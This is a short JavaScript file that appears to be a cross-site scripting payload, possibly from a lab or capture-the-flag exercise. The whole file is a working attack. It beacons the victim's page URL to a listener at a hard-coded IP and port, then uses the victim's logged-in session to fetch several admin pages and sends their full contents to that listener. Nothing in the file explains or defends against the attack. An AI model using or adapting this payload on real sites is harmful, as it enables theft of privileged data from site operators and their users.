const listener = "http://10.139.32.179:4444";

function send(endpoint, data) {
    fetch(listener + "/" + endpoint, {
        method: "POST",
        mode: "no-cors",
        body: data
    });
}

send("alive", location.href);

const pages = [
    "/admin/",
    "/admin/review.php",
    "/admin/search.php"
];

pages.forEach(url => {
    fetch(url, { credentials: "include" })
        .then(r => r.text())
        .then(body => send("page-" + btoa(url), body))
        .catch(e => send("error-" + btoa(url), e.message));
});
